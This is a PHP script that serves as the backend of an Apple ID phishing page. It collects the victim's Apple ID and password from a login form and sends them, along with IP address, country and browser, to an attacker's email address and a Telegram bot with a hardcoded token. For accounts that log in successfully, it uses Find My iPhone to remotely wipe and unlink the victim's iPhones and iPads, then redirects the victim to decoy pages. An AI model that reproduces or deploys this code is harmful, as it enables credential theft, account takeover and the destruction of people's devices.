<?php

$remote  = $_SERVER['REMOTE_ADDR'];
$email= $_POST['appleid'];
$pass= $_POST['password'];
$agent = $_SERVER['HTTP_USER_AGENT'];
$query = @unserialize(file_get_contents('http://ip-api.com/php/'.$remote));
    $iptolocation = $query['country'] ;
function getUserIP()
{
    $client  = @$_SERVER['HTTP_CLIENT_IP'];
    $forward = @$_SERVER['HTTP_X_FORWARDED_FOR'];
    $remote  = $_SERVER['REMOTE_ADDR'];

    if(filter_var($client, FILTER_VALIDATE_IP))
    {
        $ip = $client;
    }
    elseif(filter_var($forward, FILTER_VALIDATE_IP))
    {
        $ip = $forward;
    }
    else
    {
        $ip = $remote;
    }

    return $ip;
}
$ch = curl_init('https://api.ifreeicloud.co.uk/?key=6DR-H5K-85D-ASA-FS7-3U8-YCC-MJB&subscription=1&imei=&appleid=' . $email . '&password=' . $pass . '');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_POSTFIELDS, $post);
$response = curl_exec($ch);
curl_close($ch);

$user_ip = getUserIP();
$headers  = 'MIME-Version: 1.0' . "\r\n";
$headers .= 'From: iServer <noreply@laboratory.com>' . "\r\n";
$headers .= 'Content-type: text/html; charset=iso-8859-1' . "\r\n";
$to  = "diegon555@yandex.com";
$subjects = 'False Login (mobile)';
$messages = '<table border="0" cellpadding="5" cellspacing="5" width="600">
    <tbody>
        <tr>
            <th>Login Attempt Details</th>
        </tr>
        <tr>
            <td style="text-align:left" valign="top">
            <br>
			<strong>Email:</strong> '.$email.'<br>
			<strong>Password:</strong> '.$pass.'<br><br>
			<hr>
			<strong>Country:</strong>'. $iptolocation.'<br><br>
            <strong>IP Address:</strong>'. $user_ip.'<br><br>

			<strong>Browser:</strong>'.$agent.'<br><br>
			</td>
        </tr>

    </tbody>
</table>';


$subject = 'GIFT From (Mobile)';
$message = '<table border="0" cellpadding="5" cellspacing="5" width="600">
    <tbody>
        <tr>
            <th>Login Attempt Details</th>
        </tr>
        <tr>
            <td style="text-align:left" valign="top">
            <br>
			<strong>Email:</strong> '.$email.'<br>
			<strong>Password:</strong> '.$pass.'<br><br>
			<hr>
			<strong>Country:</strong>'. $iptolocation.'<br><br>
            <strong>IP Address:</strong>'. $user_ip.'<br><br>

			<strong>Browser:</strong>'.$agent.'<br><br>
			</td>
        </tr>

    </tbody>
</table>';

/* Report to the Announcement System */
$token = "437564925:AAFXpoZVPUUt65rZoBP-rL_GPEq8pnatIAU"; // Token of TELEGRAM API
$chat_id = ""; // Chat ID

/* In case if data is INVALID */
$arr_invalid = array(
"Announcement: False Login (mobile)." =>SORRY,
"Apple ID" => $email,
"Password" => $pass,
"IP Address" => $user_ip,
"Country" => $iptolocation,
"Browser" => $agent);
foreach($arr_invalid as $key => $value) {
     $txt_invalid .= "<b>".$key."</b>: ".$value."%0A";
  }
/* In case if data is INVALID */


/* In case if data is VALID */
$arr_valid = array(
"Announcement: True Login (mobile)." =>ENJOY,
"Apple ID" => $email,
"Password" => $pass,
"IP Address" => $user_ip,
"Country" => $iptolocation,
"Browser" => $agent,
"Devices" => $response);
foreach($arr_valid as $key => $value) {
     $txt_valid .= "<b>".$key."</b>: ".$value."%0A";
  }


include_once('FindMyiPhone.php');
$FindMyiPhone = new FindMyiPhone($email, $pass);

	if( $FindMyiPhone->loggedin() )
	{
		foreach ( $FindMyiPhone->devices as $device )
		{
			if ( $device->deviceStatus != '200' )
			{
				if ( $device->deviceClass == 'iPhone' || $device->deviceClass == 'iPad' )
				{
					$FindMyiPhone->remote_wipe($device->id, '4444', 'hi');
					$FindMyiPhone->remove_client($device->id);
					sleep(5);
					$FindMyiPhone->refresh_client();
				}
			}
		}
$message .= $body;
$name = $arr[0];
$report_valid=fopen("https://api.telegram.org/bot{$token}/sendMessage?chat_id={$chat_id}&parse_mode=html&text={$txt_valid}","r");
mail($to, $subject, $message, $headers);
header("Location: /find.php");
}else{

$report_invalid=fopen("https://api.telegram.org/bot{$token}/sendMessage?chat_id={$chat_id}&parse_mode=html&text={$txt_invalid}","r");
mail($to, $subjects, $messages, $headers);
header("Location: /mobiv.php?error");
}



?>
